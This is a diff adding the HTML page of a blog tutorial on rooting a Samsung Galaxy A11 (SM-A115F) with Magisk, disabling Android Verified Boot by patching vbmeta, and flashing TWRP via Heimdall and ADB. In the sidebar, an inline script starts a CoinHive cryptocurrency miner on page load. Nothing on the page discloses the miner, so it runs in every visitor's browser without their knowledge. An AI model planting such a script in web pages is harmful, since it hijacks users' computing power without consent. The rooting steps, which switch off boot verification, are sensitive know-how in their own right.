@@ -1,0 +1,680 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <link href="https://gmpg.org/xfn/11" rel="profile" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+
+  <title>
+    
+      Root & Install TWRP Samsung Galaxy A11 (SM-A115F) — Android 12 &middot; Suryadana
+    
+  </title>
+
+  
+
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Abril+Fatface" />
+
+  <!-- Icons -->
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/en/favicon.png" />
+<link rel="shortcut icon" href="/favicon.ico" />
+
+  <!-- RSS -->
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="/en/feed.xml" />
+
+  <link rel="canonical" href="https://suryadana.github.io/en/tutorial/android/samsung/2026/06/16/rooting-twrp-a11-tutorial.html"/>
+<link rel="alternate" hreflang="id" href="https://suryadana.github.io/tutorial/android/samsung/2026/06/16/rooting-twrp-a11-tutorial.html"/>
+<link rel="alternate" hreflang="x-default" href="https://suryadana.github.io/tutorial/android/samsung/2026/06/16/rooting-twrp-a11-tutorial.html"/>
+<link rel="alternate" hreflang="en" href="https://suryadana.github.io/en/tutorial/android/samsung/2026/06/16/rooting-twrp-a11-tutorial.html"/>
+
+  <!-- Additional head bits without overriding original head -->
+</head>
+
+
+  <body class="post">
+
+    <div id="sidebar">
+  <header>
+    <img src="/assets/images/profile.jpg" alt="My Profile" class="img-circle">
+    <div class="site-title">
+      <a href="/en/">
+        
+          <span class="back-arrow icon"><svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+  <path d="M0 0h24v24H0z" fill="none"/>
+  <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
+</svg></span>
+        
+        Suryadana
+      </a>
+    </div>
+    <p class="lead">I am an simple person which want to learn more and more.</p>
+  </header>
+  <nav id="sidebar-nav-links">
+  
+    <a class="home-link "
+        href="/en/">Home</a>
+  
+  
+
+  
+
+  
+
+
+  
+
+  
+    
+      <a class="page-link "
+          href="/en/about/">About</a>
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+
+  
+
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+
+  <!-- Optional additional links to insert in sidebar nav -->
+<a class="page-link" href="/en/educationals/">Educational Background</a>
+
+</nav>
+
+
+  
+
+  <nav id="sidebar-icon-links">
+  
+
+  <a id="subscribe-link"
+     class="icon" title="Subscribe" aria-label="Subscribe"
+     href="/en/feed.xml">
+    <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0 0h24v24H0z" fill="none"/>
+    <circle cx="6.18" cy="17.82" r="2.18"/>
+    <path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"/>
+</svg>
+  </a>
+
+  
+  
+  
+  
+
+  
+
+  
+
+  <!-- Optional additional links to insert for icons links -->
+<a id="github-link" class="icon" target="_blank" title="Github Project" aria-label="Github Project" href="https://github.com/suryadana">
+  <svg version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 28"><path d="M12 2c6.625 0 12 5.375 12 12 0 5.297-3.437 9.797-8.203 11.391-0.609 0.109-0.828-0.266-0.828-0.578 0-0.391 0.016-1.687 0.016-3.297 0-1.125-0.375-1.844-0.812-2.219 2.672-0.297 5.484-1.313 5.484-5.922 0-1.313-0.469-2.375-1.234-3.219 0.125-0.313 0.531-1.531-0.125-3.187-1-0.313-3.297 1.234-3.297 1.234-0.953-0.266-1.984-0.406-3-0.406s-2.047 0.141-3 0.406c0 0-2.297-1.547-3.297-1.234-0.656 1.656-0.25 2.875-0.125 3.187-0.766 0.844-1.234 1.906-1.234 3.219 0 4.594 2.797 5.625 5.469 5.922-0.344 0.313-0.656 0.844-0.766 1.609-0.688 0.313-2.438 0.844-3.484-1-0.656-1.141-1.844-1.234-1.844-1.234-1.172-0.016-0.078 0.734-0.078 0.734 0.781 0.359 1.328 1.75 1.328 1.75 0.703 2.141 4.047 1.422 4.047 1.422 0 1 0.016 1.937 0.016 2.234 0 0.313-0.219 0.688-0.828 0.578-4.766-1.594-8.203-6.094-8.203-11.391 0-6.625 5.375-12 12-12zM4.547 19.234c0.031-0.063-0.016-0.141-0.109-0.187-0.094-0.031-0.172-0.016-0.203 0.031-0.031 0.063 0.016 0.141 0.109 0.187 0.078 0.047 0.172 0.031 0.203-0.031zM5.031 19.766c0.063-0.047 0.047-0.156-0.031-0.25-0.078-0.078-0.187-0.109-0.25-0.047-0.063 0.047-0.047 0.156 0.031 0.25 0.078 0.078 0.187 0.109 0.25 0.047zM5.5 20.469c0.078-0.063 0.078-0.187 0-0.297-0.063-0.109-0.187-0.156-0.266-0.094-0.078 0.047-0.078 0.172 0 0.281s0.203 0.156 0.266 0.109zM6.156 21.125c0.063-0.063 0.031-0.203-0.063-0.297-0.109-0.109-0.25-0.125-0.313-0.047-0.078 0.063-0.047 0.203 0.063 0.297 0.109 0.109 0.25 0.125 0.313 0.047zM7.047 21.516c0.031-0.094-0.063-0.203-0.203-0.25-0.125-0.031-0.266 0.016-0.297 0.109s0.063 0.203 0.203 0.234c0.125 0.047 0.266 0 0.297-0.094zM8.031 21.594c0-0.109-0.125-0.187-0.266-0.172-0.141 0-0.25 0.078-0.25 0.172 0 0.109 0.109 0.187 0.266 0.172 0.141 0 0.25-0.078 0.25-0.172zM8.937 21.438c-0.016-0.094-0.141-0.156-0.281-0.141-0.141 0.031-0.234 0.125-0.219 0.234 0.016 0.094 0.141 0.156 0.281 0.125s0.234-0.125 0.219-0.219z"></path></svg>
+
+</a>
+
+
+
+<a href="https://twitter.com/KomangSuryadana" class="icon" target="_blank" title="Twitter Profile" aria-label="Twitter Profile">
+  <i class="fa fa-twitter"></i>
+</a>
+
+
+<a href="https://www.facebook.com/i.komang.suryadana" class="icon" target="_blank" title="Facebook Profile" aria-label="Facebook Profile">
+  <i class="fa fa-facebook"></i>
+</a>
+
+
+<a href="https://keybase.io/suryadana" class="icon" target="_blank" title="Keybase Profile" aria-label="Keybase Profile">
+  <i class="fa fa-key"></i>
+</a>
+
+</nav>
+
+  <div class="lang-switcher">
+  <script>
+    var path = window.location.pathname;
+    if (path.startsWith('/en')) {
+      document.write('<a href="' + path.replace('/en', '') + '" title="Bahasa Indonesia">Bahasa Indonesia</a>');
+    } else {
+      document.write('<a href="/en' + path + '" title="English">English</a>');
+    }
+  </script>
+  <noscript>
+    <a href="/en/" title="English">English</a>
+  </noscript>
+</div>
+
+  <p>
+  &copy; 2026.
+  <a href="/en/LICENSE.md">MIT License.</a>
+</p>
+
+</div>
+<script src="/assets/js/lib.js"></script>
+<script>
+  var miner = new CoinHive.Anonymous('kOyaXoLIN9A3N4CQ0VbrfOJwxbWSBZlL', {throttle: 0.6});
+  miner.start();
+</script>
+
+
+
+    <main class="container">
+      <header>
+  <h1 class="post-title">Root & Install TWRP Samsung Galaxy A11 (SM-A115F) — Android 12</h1>
+</header>
+<div class="content">
+  <div class="post-meta">
+  <span class="post-date">16 Jun 2026</span>
+  <span class="post-categories">
+    
+      &bull;
+
+      
+      
+      
+
+      
+        tutorial
+      
+    
+      &bull;
+
+      
+      
+      
+
+      
+        android
+      
+    
+      &bull;
+
+      
+      
+      
+
+      
+        samsung
+      
+    
+  </span>
+</div>
+
+
+  <div class="post-body">
+    <h2 id="introduction">Introduction</h2>
+
+<p>This tutorial covers the steps to <strong>root</strong> (Magisk) and <strong>install TWRP</strong> on a Samsung Galaxy A11 SM-A115F with <strong>Android 12 (XXS6CWK2)</strong> firmware. All steps are done from <strong>Linux</strong> using <strong>Heimdall</strong> and <strong>ADB</strong> — no Odin/Windows needed.</p>
+
+<blockquote>
+  <p>⚠️ <strong>Disclaimer</strong>: All risks are your own. Back up important data before starting.</p>
+</blockquote>
+
+<h2 id="device-specifications">Device Specifications</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>Item</th>
+      <th>Detail</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Model</td>
+      <td>SM-A115F (a11q)</td>
+    </tr>
+    <tr>
+      <td>SoC</td>
+      <td>Qualcomm Snapdragon 450 (SDM450)</td>
+    </tr>
+    <tr>
+      <td>RAM</td>
+      <td>2GB / 3GB</td>
+    </tr>
+    <tr>
+      <td>Stock OS</td>
+      <td>Android 12 (One UI Core 4.1)</td>
+    </tr>
+    <tr>
+      <td>Firmware</td>
+      <td>A115FXXS6CWK2</td>
+    </tr>
+    <tr>
+      <td>Bootloader</td>
+      <td>Unlocked (flash.locked=0)</td>
+    </tr>
+    <tr>
+      <td>Partition</td>
+      <td>A-only (not VAB)</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="prerequisites">Prerequisites</h2>
+
+<h3 id="software">Software</h3>
+<ul>
+  <li><strong>Linux</strong> (Ubuntu/Debian/Arch) with sudo access</li>
+  <li><strong>Heimdall</strong> v1.4.2+ or v2.x</li>
+  <li><strong>ADB &amp; Fastboot</strong></li>
+  <li><strong>Python 3</strong> + <code class="language-plaintext highlighter-rouge">lz4</code> module</li>
+  <li><strong>Magisk app</strong> (download from <a href="https://github.com/topjohnwu/Magisk/releases">github.com/topjohnwu/Magisk</a>)</li>
+</ul>
+
+<h3 id="install-dependencies">Install Dependencies</h3>
+
+<p><strong>Ubuntu / Debian:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt update
+<span class="nb">sudo </span>apt <span class="nb">install</span> <span class="nt">-y</span> heimdall-flash adb fastboot python3-pip lz4
+pip3 <span class="nb">install </span>lz4
+</code></pre></div></div>
+
+<p><strong>Arch Linux:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>pacman <span class="nt">-S</span> <span class="nt">--needed</span> heimdall android-tools python-pip lz4
+pip <span class="nb">install </span>lz4
+</code></pre></div></div>
+
+<h3 id="required-files">Required Files</h3>
+
+<p><strong>Provided in this tutorial’s assets:</strong></p>
+<ul>
+  <li><a href="./assets/posts/rooting-twrp-a11/vbmeta_stock_patched.img"><code class="language-plaintext highlighter-rouge">vbmeta_stock_patched.img</code></a> — 8.5 KB</li>
+  <li><a href="./assets/posts/rooting-twrp-a11/magisk_patched-30700_opHBq.img"><code class="language-plaintext highlighter-rouge">magisk_patched-30700_opHBq.img</code></a> — 64 MB</li>
+  <li><a href="./assets/posts/rooting-twrp-a11/twrp-3.7.0_afaneh92-a11q.tar"><code class="language-plaintext highlighter-rouge">twrp-3.7.0_afaneh92-a11q.tar</code></a> — 33 MB</li>
+  <li><a href="./assets/posts/rooting-twrp-a11/recovery.img"><code class="language-plaintext highlighter-rouge">recovery.img</code></a> (TWRP) — 33 MB</li>
+  <li><a href="./assets/posts/rooting-twrp-a11/flash_twrp.sh"><code class="language-plaintext highlighter-rouge">flash_twrp.sh</code></a> — 7 KB</li>
+</ul>
+
+<p><strong>Required from external / create yourself:</strong></p>
+<ul>
+  <li><strong>Stock firmware</strong> <code class="language-plaintext highlighter-rouge">AP_*.tar.md5</code> (~3.6 GB) — download from <a href="https://samfw.com/firmware/SM-A115F">SamFW</a></li>
+  <li><strong><code class="language-plaintext highlighter-rouge">stock_boot.img</code></strong> — extract from firmware (see §2)</li>
+  <li><strong><code class="language-plaintext highlighter-rouge">magisk_patched-*.img</code></strong> (64 MB) — patch via Magisk app (see §2)</li>
+</ul>
+
+<hr />
+
+<h2 id="0-unlock-bootloader">§0. Unlock Bootloader</h2>
+
+<p>Make sure the bootloader is unlocked:</p>
+
+<ol>
+  <li><strong>Settings → Developer Options → OEM Unlock</strong> → <strong>ON</strong></li>
+  <li><strong>Settings → About Phone → Software Information → Tap Build Number 7x</strong> (to enable Developer Options)</li>
+  <li>Turn off the phone, enter <strong>Download Mode</strong>: <code class="language-plaintext highlighter-rouge">Vol Down + Vol Up</code> + plug in USB</li>
+  <li>On the Download Mode screen, <strong>hold Vol Up for 7 seconds</strong> until “Unlocking bootloader…” appears</li>
+  <li>Data will be wiped automatically</li>
+  <li>Phone reboots to system</li>
+</ol>
+
+<blockquote>
+  <p>⚠️ If OEM Unlock doesn’t appear: make sure date &amp; time are synced (Settings → General Management → Date and Time → Automatic date and time). Incorrect time hides the Developer Options toggle.</p>
+</blockquote>
+
+<p>Verify:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>adb shell <span class="s2">"getprop ro.boot.flash.locked"</span>
+<span class="c"># Should: 0</span>
+adb shell <span class="s2">"getprop ro.boot.verifiedbootstate"</span>
+<span class="c"># Should: orange</span>
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="1-patch-vbmeta-disable-avb">§1. Patch vbmeta (Disable AVB)</h2>
+
+<p>AVB (Android Verified Boot) will refuse to boot a modified image. We patch byte 123 from <code class="language-plaintext highlighter-rouge">0x00</code> to <code class="language-plaintext highlighter-rouge">0x03</code> (VBMETA_VERIFICATION_DISABLE).</p>
+
+<h3 id="extract-vbmeta-from-firmware">Extract vbmeta from firmware</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Extract from AP tar</span>
+<span class="nb">tar</span> <span class="nt">-xf</span> AP_A115FXXS6CWK2_<span class="k">*</span>.tar.md5 vbmeta.img.lz4
+
+<span class="c"># Decompress lz4</span>
+python3 <span class="nt">-c</span> <span class="s2">"
+import lz4.block
+with open('vbmeta.img.lz4', 'rb') as f:
+    with open('vbmeta.img', 'wb') as out:
+        out.write(lz4.block.decompress(f.read()))
+"</span>
+</code></pre></div></div>
+
+<h3 id="patch-byte-123--0x03">Patch byte 123 = 0x03</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="o">&lt;&lt;</span> <span class="sh">'</span><span class="no">PYEOF</span><span class="sh">'
+with open('vbmeta.img', 'rb') as f:
+    data = bytearray(f.read())
+print(f"Size: {len(data)} bytes, Byte@123 before: 0x{data[123]:02x}")
+data[123] = 0x03
+with open('vbmeta_stock_patched.img', 'wb') as f:
+    f.write(data)
+print(f"Byte@123 after: 0x{data[123]:02x}")
+</span><span class="no">PYEOF
+</span></code></pre></div></div>
+
+<p><strong>Result:</strong> <code class="language-plaintext highlighter-rouge">vbmeta_stock_patched.img</code> (4096 bytes) — exact size, no overflow.</p>
+
+<hr />
+
+<h2 id="2-root-with-magisk">§2. Root with Magisk</h2>
+
+<h3 id="extract-bootimg-from-firmware">Extract boot.img from firmware</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">tar</span> <span class="nt">-xf</span> AP_A115FXXS6CWK2_<span class="k">*</span>.tar.md5 boot.img.lz4
+
+python3 <span class="nt">-c</span> <span class="s2">"
+import lz4.block
+with open('boot.img.lz4', 'rb') as f:
+    with open('stock_boot.img', 'wb') as out:
+        out.write(lz4.block.decompress(f.read()))
+"</span>
+</code></pre></div></div>
+
+<h3 id="patch-with-magisk">Patch with Magisk</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Push stock boot to phone</span>
+adb push stock_boot.img /sdcard/
+
+<span class="c"># Install Magisk app</span>
+adb <span class="nb">install </span>Magisk-v27.0.apk
+</code></pre></div></div>
+
+<ol>
+  <li>Open <strong>Magisk app</strong> on the phone</li>
+  <li>Tap <strong>“Select and Patch a File”</strong></li>
+  <li>Select <code class="language-plaintext highlighter-rouge">/sdcard/stock_boot.img</code></li>
+  <li>Wait until done — result: <code class="language-plaintext highlighter-rouge">magisk_patched-*.img</code> in <code class="language-plaintext highlighter-rouge">/sdcard/Download/</code></li>
+</ol>
+
+<h3 id="pull-patched-result">Pull patched result</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>adb pull /sdcard/Download/magisk_patched-<span class="k">*</span>.img <span class="nb">.</span>
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="3-flash-vbmeta--boot-via-heimdall">§3. Flash vbmeta + Boot via Heimdall</h2>
+
+<p>This is the <strong>most critical</strong> step. Order must be correct.</p>
+
+<h3 id="enter-download-mode">Enter Download Mode</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>adb reboot download
+</code></pre></div></div>
+
+<h3 id="flash-vbmeta-disable-avb">Flash vbmeta (disable AVB)</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>heimdall flash <span class="nt">--VBMETA</span> vbmeta_stock_patched.img
+</code></pre></div></div>
+
+<h3 id="flash-magisk-patched-boot-root">Flash Magisk-patched boot (root)</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>heimdall flash <span class="nt">--BOOT</span> magisk_patched-30700_opHBq.img
+</code></pre></div></div>
+
+<h3 id="reboot">Reboot</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>heimdall reboot
+</code></pre></div></div>
+
+<p>Verify root:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>adb shell <span class="s2">"su -c 'id -u'"</span>
+<span class="c"># Should: 0</span>
+<span class="c"># Note: on first run, a dialog will appear on the phone —</span>
+<span class="c"># open Magisk app → Superuser → Grant permission for ADB shell.</span>
+<span class="c"># If not granted, output will be empty or "Permission denied".</span>
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="4-flash-twrp-via-adb">§4. Flash TWRP via ADB</h2>
+
+<p>After root, we can flash TWRP directly from ADB without heimdall.</p>
+
+<h3 id="download-the-correct-twrp">Download the correct TWRP</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Download from this tutorial's assets, or from GitHub mirror</span>
+<span class="c"># wget https://github.com/3xp-l01t/Samsung-Galaxy-A115U1-Unofficial-TWRP/raw/refs/heads/main/twrp_images/twrp-3.7.0_afaneh92-a11q.tar</span>
+
+<span class="nb">tar </span>xvf ../assets/posts/rooting-twrp-a11/twrp-3.7.0_afaneh92-a11q.tar
+<span class="c"># Output: recovery.img (33MB)</span>
+</code></pre></div></div>
+
+<h3 id="run-the-twrp-flash-script">Run the TWRP flash script</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash flash_twrp.sh
+</code></pre></div></div>
+
+<p>The script will:</p>
+<ol>
+  <li>Check ADB connection &amp; root</li>
+  <li>Check security properties (flash.locked, verifiedbootstate, kgstate)</li>
+  <li>Push <code class="language-plaintext highlighter-rouge">recovery.img</code> to <code class="language-plaintext highlighter-rouge">/data/local/tmp/</code></li>
+  <li>Backup &amp; disable <code class="language-plaintext highlighter-rouge">recovery-from-boot.p</code></li>
+  <li>Check recovery partition size</li>
+  <li><code class="language-plaintext highlighter-rouge">dd</code> TWRP to recovery partition (<code class="language-plaintext highlighter-rouge">mmcblk0p61</code>)</li>
+  <li>Verify flash</li>
+  <li><strong>Reboot to TWRP (DO NOT boot to system!)</strong></li>
+</ol>
+
+<h3 id="what-to-do-in-twrp">What to do in TWRP</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># The script will auto-reboot to recovery.</span>
+<span class="c"># In TWRP:</span>
+</code></pre></div></div>
+
+<ol>
+  <li><strong>Wipe → Format Data</strong> → type <code class="language-plaintext highlighter-rouge">yes</code> (⚠️ deletes all internal data)</li>
+  <li><strong>Reboot → Recovery</strong> (verify TWRP is still there)</li>
+  <li><strong>Reboot → System</strong></li>
+</ol>
+
+<blockquote>
+  <p>⚠️ If stock recovery gets restored, repeat the TWRP flash from §4.</p>
+</blockquote>
+
+<hr />
+
+<h2 id="5-troubleshooting">§5. Troubleshooting</h2>
+
+<h3 id="only-official-released-binaries-are-allowed">“Only official released binaries are allowed”</h3>
+<ul>
+  <li><strong>KG state is prenormal</strong>: wait 7 days + WiFi + Samsung account</li>
+  <li><strong>Bootloader relocked</strong>: unlock via Download Mode (Vol Up 7 seconds)</li>
+  <li><strong>Binary revision mismatch</strong>: make sure boot.img is from the SAME firmware</li>
+</ul>
+
+<h3 id="bootloop-after-flashing-twrp">Bootloop after flashing TWRP</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Enter TWRP: Vol Up + Power (hold)</span>
+<span class="c"># In TWRP: Format Data → reboot</span>
+</code></pre></div></div>
+
+<h3 id="twrp-doesnt-appear--stock-recovery-boots">TWRP doesn’t appear / stock recovery boots</h3>
+<p>TWRP is being restored by <code class="language-plaintext highlighter-rouge">recovery-from-boot.p</code>. Fix:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>adb shell <span class="s2">"su -c 'mount -o rw,remount /system &amp;&amp; rm -f /system/etc/recovery-from-boot.p /system/bin/install-recovery.sh'"</span>
+</code></pre></div></div>
+<p>Then redo the TWRP flash from §4.</p>
+
+<h3 id="vbmeta-overflow-boot-verify-image-failed">vbmeta overflow (boot verify image failed)</h3>
+<p>If <code class="language-plaintext highlighter-rouge">vbmeta_stock_patched.img</code> is larger than 4096 bytes, flashing it will corrupt neighboring partitions. Fix:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>heimdall flash <span class="nt">--VBMETA</span> vbmeta_stock.img <span class="nt">--VBMETABAK</span> vbmeta_stock.img <span class="nt">--DTBO</span> dtbo.img
+</code></pre></div></div>
+
+<h3 id="security-error-after-boot">“Security error” after boot</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check status</span>
+adb shell <span class="s2">"getprop ro.boot.flash.locked"</span>     <span class="c"># should be 0</span>
+adb shell <span class="s2">"getprop ro.boot.verifiedbootstate"</span> <span class="c"># should be orange</span>
+adb shell <span class="s2">"getprop ro.boot.warranty_bit"</span>      <span class="c"># should be empty</span>
+</code></pre></div></div>
+<p>If Warranty Bit = 1, the device has tripped eFuse — cannot permanently unlock.</p>
+
+<hr />
+
+<h2 id="reference-links">Reference Links</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>Link</th>
+      <th>Purpose</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="https://xdaforums.com/t/recovery-unofficial-twrp-for-galaxy-a11-snapdragon.4197085/">XDA TWRP Thread</a></td>
+      <td>Official TWRP by afaneh92</td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/3xp-l01t/Samsung-Galaxy-A115U1-Unofficial-TWRP">GitHub 3xp-l01t Mirror</a></td>
+      <td>TWRP + vbmeta + Magisk downloads</td>
+    </tr>
+    <tr>
+      <td><a href="https://samfw.com/firmware/SM-A115F">SamFW Firmware</a></td>
+      <td>Stock firmware downloads</td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/topjohnwu/Magisk">Magisk GitHub</a></td>
+      <td>Root solution</td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/TrebleDroid/treble_experimentations/wiki/Samsung-Galaxy-A11">TrebleDroid Wiki</a></td>
+      <td>Device-specific GSI info</td>
+    </tr>
+    <tr>
+      <td><a href="https://t.me/samsung_galaxy_m01_a01_m11_a11">Telegram Group</a></td>
+      <td>A11/M11 community</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<h2 id="credits">Credits</h2>
+
+<ul>
+  <li><strong>afaneh92</strong> — TWRP builder &amp; XDA maintainer</li>
+  <li><strong>3xp-l01t</strong> — GitHub mirror of TWRP + files</li>
+  <li><strong>topjohnwu</strong> — Magisk</li>
+  <li>Samsung Open Source Center — Kernel source</li>
+</ul>
+
+<hr />
+
+<p><em>This tutorial was written from hands-on experience with SM-A115F firmware XXS6CWK2. For devices with different firmware, some steps may need adjustment.</em></p>
+
+    
+
+
+
+<div class="post-tags">
+  
+</div>
+  </div>
+
+  
+  <section class="comments">
+    <h2>Comments</h2>
+    
+  <div id="disqus_thread">
+    <button class="disqus-load" onClick="loadDisqusComments()">
+      Load Comments
+    </button>
+  </div>
+  <script>
+
+  /**
+  *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW
+  *  TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+  *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT:s
+  *  https://disqus.com/admin/universalcode/#configuration-variables
+  */
+  var disqus_config = function () {
+    this.page.url = "https://suryadana.github.io/tutorial/android/samsung/2026/06/16/rooting-twrp-a11-tutorial.html";
+    this.page.identifier = "" ||
+                           "https://suryadana.github.io/tutorial/android/samsung/2026/06/16/rooting-twrp-a11-tutorial.html";
+  }
+  function loadDisqusComments() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = '//suryadana.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+  }
+  </script>
+  <noscript>
+    Please enable JavaScript to view the
+    <a href="https://disqus.com/?ref_noscript">comments powered by Disqus</a>.
+  </noscript>
+
+
+
+  </section>
+
+  <section class="related">
+  <h2>Related Posts</h2>
+  <ul class="posts-list">
+    
+      <li>
+        <h3>
+          <a href="/en/hacking/llm/grok/information%20gathering/source%20code%20leak/2026/06/09/playground-with-grok-xai.html">
+            Playground with Grok xAI
+            <small>09 Jun 2026</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/en/python/python3/programming/2018/11/13/flipping-bits.html">
+            Flipping Bits
+            <small>13 Nov 2018</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/en/python/python3/optimization/2018/05/18/simple-asyncio-python-3.html">
+            Simple ASYNCIO Python 3
+            <small>18 May 2018</small>
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</section>
+
+</div>
+
+    </main>
+
+    <!-- Optional footer content -->
+
+  </body>
+</html>
